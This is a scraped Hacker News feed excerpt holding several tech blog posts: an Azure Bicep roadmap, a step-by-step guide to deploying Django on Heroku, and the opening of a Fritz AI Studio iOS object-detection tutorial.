<p>I find Ink enjoyable to write code with. It’s terse, functional, and for small solutions it’s extremely clear to read. Programs are easy to share and deploy; a binary and a script. After reading some of Linus’s passionate <a href="https://dotink.co/posts/">technical articles</a> about Ink I felt an unexplainable yearning to try it out. So I did.</p>
<p>The future of Ink sounds exciting. I caught up with Linus a few days ago and he hinted at an experimental implementation written in Rust. He suggested some language problems that might be fixed too. He also pointed me towards resources on interpreters and compilers which I’ve been devouring. Who knows — maybe I’ll be writing about my own programming language one day soon.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/learning-the-ink-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517321</guid>
            <pubDate>Fri, 18 Sep 2020 14:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Azure Bicep Roadmap Q4'20 into 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517271">thread link</a>) | @crpietschmann
<br/>
September 18, 2020 | https://build5nines.com/azure-bicep-roadmap-q420-into-2021/ | <a href="https://web.archive.org/web/*/https://build5nines.com/azure-bicep-roadmap-q420-into-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content">
		<div>
		<div id="content-area">
			<div id="left-area">
											<article id="post-30059">
											<div>
							

						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=48&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=96&amp;d=identicon&amp;r=g 2x" height="48" width="48" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p><img src="https://i0.wp.com/build5nines.com/wp-content/uploads/2020/09/Azure_Bicep_Featured_Image.jpg?fit=900%2C506&amp;ssl=1" alt="Azure Bicep Roadmap Q4’20 into 2021" width="900" height="506">
												</p></div> <!-- .et_post_meta_wrapper -->
				
					<div>
					
<p>Microsoft recently released the first preview of the <a href="https://build5nines.com/get-started-with-azure-bicep/">Azure Bicep project</a> which provides a new, more intuitive language for building out infrastructure as code deployments in Microsoft Azure. The v0.1 release includes support for a number of great features, including automatic support for Azure Resource Providers (ARM Providers) and API Versions (“apiVersion”) of the APIs. A few features that were announced to be coming soon includes code reuse through modules, loops, and more!</p>



<p>Here’s a short timeline / roadmap for <a href="https://build5nines.com/get-started-with-azure-bicep/">Azure Bicep</a> that was announced my Microsoft:</p>



<br><h2>Azure Bicep v0.1 (already released)</h2>



<ul><li>Project launch &amp; public repo went live August 31, 2020 (alpha release)</li></ul>



<h2>Azure Bicep v0.2 (coming October / November 2020)</h2>



<ul><li>Add Visual Studio Code Intellisense support (expected October)</li><li>Add Module support for code reuse (expected November)</li></ul>



<h2>Azure Bicep v0.3 (coming December 2020 / January 2021)</h2>



<ul><li>More features being added to Bicep that are already supported by ARM Templates<ul><li>Loops</li><li>Conditionals</li></ul></li><li>Decompiler that can convert existing ARM Templates into Azure Bicep code files</li><li>Encouragement of using Azure Bicep in Production environments</li></ul>



<figure><img data-attachment-id="30062" data-permalink="https://build5nines.com/azure-bicep-roadmap-q420-into-2021/image-5-4/" data-orig-file="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?fit=714%2C588&amp;ssl=1" data-orig-size="714,588" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-5" data-image-description="" data-medium-file="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?fit=300%2C247&amp;ssl=1" data-large-file="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?fit=714%2C588&amp;ssl=1" loading="lazy" width="714" height="588" src="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?resize=714%2C588&amp;ssl=1" alt="Azure Bicep Roadmap Q4'20 into 2021 1" srcset="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?resize=714%2C588&amp;ssl=1 714w, https://build5nines.com/wp-content/uploads/2020/09/image-5-480x395.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 714px, 100vw" title="Azure Bicep Roadmap Q4'20 into 2021 1" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?resize=714%2C588&amp;ssl=1 714w, https://build5nines.com/wp-content/uploads/2020/09/image-5-480x395.png 480w" data-lazy-src="https://i1.wp.com/build5nines.com/wp-content/uploads/2020/09/image-5.png?resize=714%2C588&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Azure Bicep Roadmap for Q4’20 into 2021</figcaption></figure>



<p>This timeline of features coming to Azure Bicep was announced by Microsoft in a YouTube video that was <a href="https://www.youtube.com/watch?v=-4E5DsC-RcU" target="_blank" rel="noopener">published</a> this week. Hopefully we’ll be able to see more news about the features coming to Azure Bicep during Microsoft Ignite 2020.</p>
<br>
						
											
						
					
					<h3>Article Author</h3>
					<div id="author-info">
						<p><img alt="" src="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=128&amp;d=identicon&amp;r=g" srcset="https://secure.gravatar.com/avatar/d565ce4d3fdf8007e1d707362cca9465?s=256&amp;d=identicon&amp;r=g 2x" height="128" width="128" loading="lazy" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">																						<img id="author-img-mvp" src="https://build5nines.com/wp-content/uploads/2019/08/mvp_logo_horizontal_preferred_cyan300_rgb_300ppi_163x65.png" alt="Microsoft MVP">
													</p>
						
						<p id="author-desc">Chris is the <strong>Founder of Build5Nines.com</strong> and a <strong>Microsoft MVP</strong> in Azure &amp; IoT with 20 years of experience designing and building Cloud &amp; Enterprise systems. He is also a <strong>Microsoft Certified: Azure Solutions Architect</strong>, developer, <strong>Microsoft Certified Trainer</strong> (MCT), and Cloud Advocate. He has a passion for technology and sharing what he learns with others to help enable them to learn faster and be more productive.</p>
						
					</div>
					
											
										</div> <!-- .entry-content -->
					 <!-- .et_post_meta_wrapper -->
				</article> <!-- .et_pb_post -->

						</div> <!-- #left-area -->

				 <!-- end #sidebar -->
		</div> <!-- #content-area -->
	</div> <!-- .container -->
	</div></div>]]>
            </description>
            <link>https://build5nines.com/azure-bicep-roadmap-q420-into-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517271</guid>
            <pubDate>Fri, 18 Sep 2020 14:34:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to deploy a Django web application to Heroku – a comprehensive guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517230">thread link</a>) | @Didicodes
<br/>
September 18, 2020 | https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z | <a href="https://web.archive.org/web/*/https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The process of taking a project from a local machine to the internet is in many ways a magical one. Heroku is a platform-as-a-service solution that offers simple deployment options to developers. This article will present a step-by-step guide to deploying Django applications on <a target="_blank" href="https://www.heroku.com/">Heroku</a>.</p>
<h3 id="deployment-setup">Deployment setup</h3>
<p>First, ensure that you have the Heroku CLI installed. If you do not, <a target="_blank" href="https://devcenter.heroku.com/articles/heroku-cli">visit this link</a> for installation instructions.</p>
<pre><code>heroku -v
</code></pre>
<p>Log into Heroku, by using the command below. This should open up your default browser, and prompt you to authenticate via the click of a button.</p>
<pre><code>heroku login
</code></pre>
<p>Install <code>gunicorn</code>, a tool that allows you to run a light-weight web server. This is essential for deployment on the Heroku platform.</p>
<pre><code> pip install gunicorn
</code></pre>
<p>Create a <code>Procfile</code>. Think of this as a way to list the process types within your web application. From the command, it can be seen that this works together with the <code>gunicorn</code> package earlier installed. Replace <code>&lt;project-name&gt;</code> with the name used when creating the Django project.</p>
<pre><code>web: gunicorn &lt;project-name&gt;.wsgi --log-file -
</code></pre>
<p>Add a <code>runtime.txt</code> file. This helps Heroku know what Python runtime you would like to use to run your application. I prefer to use the runtime I work with on my development machine. This has worked for me across a variety of deploys so far.</p>
<pre><code>python-3.7.4
</code></pre>
<h3 id="application-creation">Application creation</h3>
<p>Create an Heroku application with the following command. Here <code>&lt;app-name&gt;</code> will be replaced with the name of choice for your web app.</p>
<pre><code>heroku apps:create &lt;app-name&gt;
</code></pre>
<p>The next thing to do is creating a database. This guide favours PostgreSQL. Here is the relevant command.</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev --version=11 --app &lt;app-name&gt;
</code></pre>
<p>If your web application is like most others, you will need to serve static files as well. An efficient tool for this can be installed as follows.</p>
<pre><code>pip install whitenoise
</code></pre>
<p><strong>Whitenoise</strong> offers a number of configuration options for Django. I have found that the following works best on Heroku with most deployments. Place this at the base of the settings file, along with the other static configurations.</p>
<pre><code>

STATICFILES_STORAGE = <span>'whitenoise.storage.CompressedStaticFilesStorage'</span>
</code></pre>
<p>It is essential to include the WhiteNoise middleware as well. This is done by placing it directly after the security middleware, and before all others. This is shown directly below.</p>
<pre><code>MIDDLEWARE = [
    <span>'django.middleware.security.SecurityMiddleware'</span>,
    <span>'whitenoise.middleware.WhiteNoiseMiddleware'</span>,
    ...
]
</code></pre>
<p>This is a good time to set up your Django app to use environment variables. A package that helps greatly with this is <code>django-environ</code>. Install this via pip, and add the following to your <code>settings.py</code> file:</p>
<pre><code><span>import</span> environ


env = environ.Env(
    DEBUG=(bool, <span>False</span>)
)
environ.Env.read_env()  

DEBUG = env(<span>'DEBUG'</span>)  
</code></pre>
<p>Place your <code>.env</code> file at a location of choice in your source code - remember to include it in your <code>.gitignore</code> file.</p>
<p>Remember to set up your <code>ALLOWED_HOSTS</code> in such a way as to create a list of valid addresses. This should be done with an environment variable. This could result in an application error if not done properly.</p>
<h3 id="creating-a-new-secret-key">Creating a new Secret Key</h3>
<p>Upon creating a Django web application a <strong>SECRET_KEY</strong> is automatically generated. In the haste of making that first commit, this can inadvertently be added to one's git history. This is a security nightmare waiting to happen.</p>
<p>You can fix this by doing the following:</p>
<ul>
<li>Access the python shell made available via Django.</li>
</ul>
<pre><code>python manage.py shell
</code></pre>
<ul>
<li>Access the <code>get_random_secret_key</code> method that comes with Django and produce a new string. This can be done repeatedly - if necessary.</li>
</ul>
<pre><code><span>from</span> django.core.management.utils <span>import</span> get_random_secret_key; print(get_random_secret_key())
</code></pre>
<p>You can save the new value generated above to an environment variable, and do the same in the settings section of your Heroku deployment(s).</p>
<h3 id="database-setup">Database setup</h3>
<p>At this point, you will need to acquire the link to the Postgres database created earlier. In the place of <code>&lt;app-name&gt;</code>, use the name you chose when creating your application on Heroku.</p>
<pre><code>heroku config:get DATABASE_URL --app &lt;app-name&gt;
</code></pre>
<p>With the newly acquired database link, you will now set this as a configuration variable via the command below. This links your Django web application once deployed to the Postgres database created.</p>
<pre><code>heroku config:add DATABASE_URL=&lt;DATABASE_URL value&gt; --app &lt;app-name&gt;
</code></pre>
<p>Your default database config should look like this.</p>
<pre><code>

DATABASES = {
    <span>'default'</span>: {
        <span>'ENGINE'</span>: <span>'django.db.backends.sqlite3'</span>,
        <span>'NAME'</span>: os.path.join(BASE_DIR, <span>'db.sqlite3'</span>),
    }
}
</code></pre>
<p>This needs to be replaced with suitable Postgres configuration that works with your Heroku deployment.</p>
<pre><code>DB_INFO = db_parser(os.environ[<span>'DATABASE_URL'</span>])

DATABASES = {
    <span>'default'</span>: {
        <span>'ENGINE'</span>: <span>'django.db.backends.postgresql_psycopg2'</span>,
        <span>'NAME'</span>: DB_INFO[<span>'name'</span>],
        <span>'USER'</span>: DB_INFO[<span>'user'</span>],
        <span>'PASSWORD'</span>: DB_INFO[<span>'password'</span>],
        <span>'HOST'</span>: DB_INFO[<span>'host'</span>],
        <span>'PORT'</span>: DB_INFO[<span>'port'</span>],
    }
}
</code></pre>
<p>For the Postgres configuration, I present to you a <a target="_blank" href="https://github.com/Usheninte/DjangoHeroku/blob/master/custom/db_url_parser.py">very rough parser</a> function. It extracts the values needed for essential fields in Databases' dictionary. These values are from the <strong>DATABASE_URL</strong> provided by Heroku.</p>
<p>What I would advise is creating a conditional that switches between these two configurations based on the value of an environmental variable. This is not totally <strong>12factor</strong> but helps with swift development setup.</p>
<pre><code>pip install psycopg2-binary
</code></pre>
<p>As a final step install the package above to help your Django application work with Postgres. According to the <a target="_blank" href="https://pypi.org/project/psycopg2-binary/">PyPI page</a>, <em>"Psycopg is the most popular PostgreSQL database adapter for the Python programming language"</em>.</p>
<h3 id="final-steps">Final steps</h3>
<p>Ensure for good measure that your Heroku app has been initialized via git. The following command helps with this:</p>
<pre><code>git remote -v
</code></pre>
<p>You should see a remote named <code>heroku</code> with a git file with name similarities to the application you created earlier.</p>
<p>If you do not see this, simply add the Heroku app manually. Do this by taking the link to the git repository in the settings section of your deployment. With this link, run the following command, replacing <code>&lt;Heroku git URL&gt;</code> with the link acquired.</p>
<pre><code>git remote add heroku &lt;Heroku git URL&gt;
</code></pre>
<p>Next, disable <strong>COLLECTSTATIC</strong> for the application. This prevents Heroku from collecting static files on your behalf. If not disabled, this can result in build failures, if static file collection does not succeed for whatever reason.</p>
<pre><code>heroku config:set DISABLE_COLLECTSTATIC=1
</code></pre>
<p>One of the most important final steps involves creating a requirements file. This is necessary to properly run the web application.</p>
<pre><code>pip freeze &gt; requirements.txt
</code></pre>
<p>We have arrived at the moment all of this has been progressing towards - deployment. The command is as follows:</p>
<pre><code>git push heroku master
</code></pre>
<p>We will need to start a web dyno, which is essentially the server of sorts. This is where our application will run on the Heroku platform.</p>
<pre><code>heroku ps:scale web=1
</code></pre>
<p>Remember to migrate the changes made during development on the deployment database as well.</p>
<pre><code>heroku run python manage.py migrate
</code></pre>
<p>Never run <code>makemigrations</code> on Heroku directly as this has little effect in the long-term. The filesystem on the platform is ephemeral and will not retain your changes beyond the moments during which your app is running. </p>
<p>For this reason, it is best to commit your migrations to git, and simply migrate these on the platform directly.</p>
<pre><code>heroku run python manage.py createsuperuser
</code></pre>
<p>Above is Heroku's flavour of the quintessential Django command. Create your superuser and your app is good to go. Configured and deployed on the Heroku platform - in the most comprehensive and efficient way.</p>
<blockquote>
<p>You might find these <a target="_blank" href="https://github.com/Usheninte/DjangoHeroku/blob/master/django_heroku_project/settings.py">settings for a sample project</a> useful. It is configured for Heroku deployment.</p>
</blockquote>
<hr>
<p><em>Cover base from <a target="_blank" href="https://unsplash.com/photos/bQzkVXkMC94">Unsplash</a></em></p>
</div></div>]]>
            </description>
            <link>https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517230</guid>
            <pubDate>Fri, 18 Sep 2020 14:30:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Train and Run an Object Detection Model Using Fritz AI Studio in iOS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516940">thread link</a>) | @anupamchugh
<br/>
September 18, 2020 | https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="1b3f">Computer Vision — iOS</h2><h2 id="82dd">Leverage Fritz AI to quickly generate a dataset and train an iOS-ready object detection model</h2><div><div><div><p><a href="https://heartbeat.fritz.ai/@omarmhaimdat?source=post_page-----c2c1a1fcc16d--------------------------------" rel="noopener"><img alt="Omar M’Haimdat" src="https://miro.medium.com/fit/c/96/96/1*XIWnqvdaUXa8QjxlXcDSnw.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="1c36">Let’s say you’re walking around your favorite grocery store looking for fresh produce or other processed foods available in the store. Then you wonder what it would take to make your own mayonnaise or even homemade Nutella.</p><p id="b2c3">The idea seems cool, but the problem with this idea is that you have to open your favorite note-taking application, start bookmarking whatever recipes you find on the internet, and then (most importantly) find the right products to buy in order to execute the recipe at home.</p><p id="7355">During quarantine, I’ve enjoyed making my own sourdough bread, fresh pasta, or even pickled vegetables. Now that we’re starting to emerge out of quarantine, we can take more time to look around and try new products. While doing that, I kept asking myself what it would take to make my own Nutella or a better version of boxed mac &amp; cheese.</p><p id="4ad6">The challenge here is to rapidly detect and find the right recipe for any product for which a homemade version is available. Then I remembered…I’m an engineer, so maybe I can build an iOS application that can detect and classify products and recommend a recipe.</p><p id="6708">In this article, I’ll use <a href="https://www.fritz.ai/product/studio.html" rel="noopener">Fritz AI Studio</a> to create a model that can detect/classify products and propose a homemade recipe with a list of ingredients needed—all done in real-time on an iOS application.</p><ol><li id="fbff">Understanding the use case</li><li id="19c8">Why Fritz AI?</li><li id="b7ee">Create a new project in Fritz AI Studio</li><li id="ef83">Fritz AI dataset generator</li><li id="b1b2">Train an object detection model with Fritz AI</li><li id="b6e9">Build the iOS application</li><li id="2b6d">Conclusion &amp; perspectives</li></ol><p id="38b5">I have included code in this article where it’s most instructive. Full code and data can be found on my <a href="https://github.com/omarmhaimdat" rel="noopener">GitHub page</a>. Let’s get started.</p></div></div></section><hr><section><div><div><p id="d9f9">The idea is pretty simple and straightforward—I want to be able to easily open my phone and point the camera at a product and instantly get a proposition for a homemade recipe, including a list of products I should have in order to execute it.</p><p id="0204">The whole process should be easy and fast for the use—I envision it as the following:</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4800/1*INqh_FoWjwA7m0dbUP0_pg.png" width="2400" height="281" srcset="https://miro.medium.com/max/552/1*INqh_FoWjwA7m0dbUP0_pg.png 276w, https://miro.medium.com/max/1104/1*INqh_FoWjwA7m0dbUP0_pg.png 552w, https://miro.medium.com/max/1280/1*INqh_FoWjwA7m0dbUP0_pg.png 640w, https://miro.medium.com/max/1456/1*INqh_FoWjwA7m0dbUP0_pg.png 728w, https://miro.medium.com/max/1632/1*INqh_FoWjwA7m0dbUP0_pg.png 816w, https://miro.medium.com/max/1808/1*INqh_FoWjwA7m0dbUP0_pg.png 904w, https://miro.medium.com/max/1984/1*INqh_FoWjwA7m0dbUP0_pg.png 992w, https://miro.medium.com/max/2000/1*INqh_FoWjwA7m0dbUP0_pg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*INqh_FoWjwA7m0dbUP0_pg.png?q=20"></p></div></div></div><figcaption>Figure 1: Simplified process</figcaption></figure></div></div></div></section><hr><section><div><div><p id="ef4a">There are many ways to implement the use case explained above, but major obstacles might stop you from experimenting and rapidly iterating through your idea. Fritz AI has a number of benefits that I think make it perfect for these kinds of projects:</p><ul><li id="ac3e"><strong>Dataset generator: </strong>Since I don’t have the resources or the time to create a dataset of thousands of images, Fritz AI allows you, with very few initial images, to generate an important set of images using the Snapshot feature.</li><li id="e76a"><strong>Easy and fast:</strong> Using Fritz AI, I know that I can stay in the same environment, and I don’t have to worry if the training process went well, basically I only need to half monitor the process.</li><li id="ff05"><strong>Generous free tier:</strong> 5 hours of training per month and 10,000 dataset images. It’s generous enough to get you started.</li><li id="fd44"><strong>Optimized mobile-ready models:</strong> Fritz AI models are designed to perform well in mobile environments, where inference time is key and accuracy is a major plus.</li></ul><p id="b1ff">Many other features are interesting but more focused on the production side, which isn’t coved in this article.</p></div></div></section><hr><section></section><hr><section><div><div><p id="ed00">You can create a new project in the left menu. To do this, you’ll need to:</p><ul><li id="1091">Specify the project type—<strong>custom</strong> means you can train a model with your own dataset.</li><li id="cafd">The model type—object detection for this project</li><li id="205b">Upload your dataset (optional—we don’t have a dataset to start out, so we won’t do this yet)</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*LFILdabdMrr-SkyokWeIpA.png" width="3264" height="663" srcset="https://miro.medium.com/max/552/1*LFILdabdMrr-SkyokWeIpA.png 276w, https://miro.medium.com/max/1104/1*LFILdabdMrr-SkyokWeIpA.png 552w, https://miro.medium.com/max/1280/1*LFILdabdMrr-SkyokWeIpA.png 640w, https://miro.medium.com/max/1456/1*LFILdabdMrr-SkyokWeIpA.png 728w, https://miro.medium.com/max/1632/1*LFILdabdMrr-SkyokWeIpA.png 816w, https://miro.medium.com/max/1808/1*LFILdabdMrr-SkyokWeIpA.png 904w, https://miro.medium.com/max/1984/1*LFILdabdMrr-SkyokWeIpA.png 992w, https://miro.medium.com/max/2160/1*LFILdabdMrr-SkyokWeIpA.png 1080w, https://miro.medium.com/max/2700/1*LFILdabdMrr-SkyokWeIpA.png 1350w, https://miro.medium.com/max/3240/1*LFILdabdMrr-SkyokWeIpA.png 1620w, https://miro.medium.com/max/3780/1*LFILdabdMrr-SkyokWeIpA.png 1890w, https://miro.medium.com/max/4320/1*LFILdabdMrr-SkyokWeIpA.png 2160w, https://miro.medium.com/max/4800/1*LFILdabdMrr-SkyokWeIpA.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*LFILdabdMrr-SkyokWeIpA.png?q=20"></p></div></div><figcaption>Figure 2: Create a new Object Detection project</figcaption></figure></div><div><p id="db5a">In this project, we want to detect and classify a product. As such, we choose to build and <a href="https://www.fritz.ai/object-detection/" rel="noopener">object detection</a> model. You can directly add your dataset during this process, but I choose to look around before uploading images.</p></div></section><hr><section><div><div><p id="0d20">There are five main steps in this part of the process:</p><ul><li id="293c"><strong>Collect:</strong> The dataset generator requires a set of transparent images to get started, because it will use the transparent images and overlay them on a bunch of random images. There are many ways to find these “seed” images—you can start looking for images of the products you want the model to identify. You can use Google images as a way to accelerate this process—Facebook and Instagram can also be useful. There’s a way to filter out transparent images in Google, but be careful, because sometimes they are not fully transparent or are only partially transparent.</li></ul><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*IcafZFW8gdsI0nIvI6wqYQ.png" width="3264" height="1629" srcset="https://miro.medium.com/max/552/1*IcafZFW8gdsI0nIvI6wqYQ.png 276w, https://miro.medium.com/max/1104/1*IcafZFW8gdsI0nIvI6wqYQ.png 552w, https://miro.medium.com/max/1280/1*IcafZFW8gdsI0nIvI6wqYQ.png 640w, https://miro.medium.com/max/1400/1*IcafZFW8gdsI0nIvI6wqYQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*IcafZFW8gdsI0nIvI6wqYQ.png?q=20"></p></div></div></div><figcaption>Figure 3: Not fully transparent and partially transparent images</figcaption></figure><ul><li id="7a00"><strong>Remove the background:</strong> Plenty of services propose a way to remove image backgrounds for free such as <a href="https://www.remove.bg/" rel="noopener">remove.bg</a> or <a href="https://clippingmagic.com/" rel="noopener">clippingmagic.com</a>. If you don’t want to use these services, <a href="https://www.adobe.com/products/photoshop.html" rel="noopener">Photoshop</a> can be used, as well as Preview (macOS only) or <a href="https://www.gimp.org/" rel="noopener">GIMP</a>.</li><li id="de5b"><strong>Upload:</strong> When all the images are ready, go to Datasets -&gt; Add Image Collection -&gt; Upload images</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*RWII2XZIQ6L5jgScEGgkUg.png" width="3264" height="647" srcset="https://miro.medium.com/max/552/1*RWII2XZIQ6L5jgScEGgkUg.png 276w, https://miro.medium.com/max/1104/1*RWII2XZIQ6L5jgScEGgkUg.png 552w, https://miro.medium.com/max/1280/1*RWII2XZIQ6L5jgScEGgkUg.png 640w, https://miro.medium.com/max/1456/1*RWII2XZIQ6L5jgScEGgkUg.png 728w, https://miro.medium.com/max/1632/1*RWII2XZIQ6L5jgScEGgkUg.png 816w, https://miro.medium.com/max/1808/1*RWII2XZIQ6L5jgScEGgkUg.png 904w, https://miro.medium.com/max/1984/1*RWII2XZIQ6L5jgScEGgkUg.png 992w, https://miro.medium.com/max/2160/1*RWII2XZIQ6L5jgScEGgkUg.png 1080w, https://miro.medium.com/max/2700/1*RWII2XZIQ6L5jgScEGgkUg.png 1350w, https://miro.medium.com/max/3240/1*RWII2XZIQ6L5jgScEGgkUg.png 1620w, https://miro.medium.com/max/3780/1*RWII2XZIQ6L5jgScEGgkUg.png 1890w, https://miro.medium.com/max/4320/1*RWII2XZIQ6L5jgScEGgkUg.png 2160w, https://miro.medium.com/max/4800/1*RWII2XZIQ6L5jgScEGgkUg.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*RWII2XZIQ6L5jgScEGgkUg.png?q=20"></p></div></div><figcaption>Figure 4: Create a new Seed Image Collection</figcaption></figure></div><div><div><p id="eea5">In the process of uploading, Fritz AI will warn you if any image is not transparent—you can delete it and upload it afterwards for better results. I was hoping this could be enforced in some way, or maybe even have Fritz AI propose a segmentation of the background inside the webapp itself.</p><ul><li id="d4a1"><strong>Annotate:</strong> when all images are uploaded, a whole new menu at the top will appear with an image annotation interface. The process is pretty simple and straightforward. You start by creating new classes, with each one having a different color. In my case, I have three classes (nutella, mayonnaise_hellmann, mac_cheese) and 100 images (insufficient, IMO).</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*38AXUSeLjjFHM2ucfUvlJg.png" width="3264" height="481" srcset="https://miro.medium.com/max/552/1*38AXUSeLjjFHM2ucfUvlJg.png 276w, https://miro.medium.com/max/1104/1*38AXUSeLjjFHM2ucfUvlJg.png 552w, https://miro.medium.com/max/1280/1*38AXUSeLjjFHM2ucfUvlJg.png 640w, https://miro.medium.com/max/1456/1*38AXUSeLjjFHM2ucfUvlJg.png 728w, https://miro.medium.com/max/1632/1*38AXUSeLjjFHM2ucfUvlJg.png 816w, https://miro.medium.com/max/1808/1*38AXUSeLjjFHM2ucfUvlJg.png 904w, https://miro.medium.com/max/1984/1*38AXUSeLjjFHM2ucfUvlJg.png 992w, https://miro.medium.com/max/2160/1*38AXUSeLjjFHM2ucfUvlJg.png 1080w, https://miro.medium.com/max/2700/1*38AXUSeLjjFHM2ucfUvlJg.png 1350w, https://miro.medium.com/max/3240/1*38AXUSeLjjFHM2ucfUvlJg.png 1620w, https://miro.medium.com/max/3780/1*38AXUSeLjjFHM2ucfUvlJg.png 1890w, https://miro.medium.com/max/4320/1*38AXUSeLjjFHM2ucfUvlJg.png 2160w, https://miro.medium.com/max/4800/1*38AXUSeLjjFHM2ucfUvlJg.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*38AXUSeLjjFHM2ucfUvlJg.png?q=20"></p></div></div><figcaption>Figure 5: Create classes and annotate</figcaption></figure></div><div><div><ul><li id="89f5"><strong>Generate:</strong> This is where all the magic happens. With your labeled seed images, Fritz AI will create synthetic images based on your original images, with some sort of augmentation built-in (I wish I had control of this part). You can also monitor how many images have been generated.</li></ul></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*z4zRuBpkwQWn0zjWvZ0nrw.png" width="2880" height="816" srcset="https://miro.medium.com/max/552/1*z4zRuBpkwQWn0zjWvZ0nrw.png 276w, https://miro.medium.com/max/1104/1*z4zRuBpkwQWn0zjWvZ0nrw.png 552w, https://miro.medium.com/max/1280/1*z4zRuBpkwQWn0zjWvZ0nrw.png 640w, https://miro.medium.com/max/1456/1*z4zRuBpkwQWn0zjWvZ0nrw.png 728w, https://miro.medium.com/max/1632/1*z4zRuBpkwQWn0zjWvZ0nrw.png 816w, https://miro.medium.com/max/1808/1*z4zRuBpkwQWn0zjWvZ0nrw.png 904w, https://miro.medium.com/max/1984/1*z4zRuBpkwQWn0zjWvZ0nrw.png 992w, https://miro.medium.com/max/2000/1*z4zRuBpkwQWn0zjWvZ0nrw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*z4zRuBpkwQWn0zjWvZ0nrw.png?q=20"></p></div></div></div><figcaption>Figure 6: Monitor the snapshot generation</figcaption></figure></div></div></div><div><div><p id="127f">You will notice that it will propose a number of generated images relative to the number of classes you have. In this case, I have three classes, which means it naturally proposed 9,900 images rather than the 10,000 I was aiming for. This helps in making sure we end up with a balanced dataset Snapshot.</p><p id="1c91">Fritz AI will send you an email when this process is finished. The images created are a bunch of random images on which they overlay the labeled, transparent seed images. It’s kind of brilliant because you can change the context in which an image is taken, and helps ensure a more diverse dataset for better model training.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4700/1*UB6l-L5ljrzWSMl5JD3Ksw.png" width="2350" height="1182" srcset="https://miro.medium.com/max/552/1*UB6l-L5ljrzWSMl5JD3Ksw.png 276w, https://miro.medium.com/max/1104/1*UB6l-L5ljrzWSMl5JD3Ksw.png 552w, https://miro.medium.com/max/1280/1*UB6l-L5ljrzWSMl5JD3Ksw.png 640w, 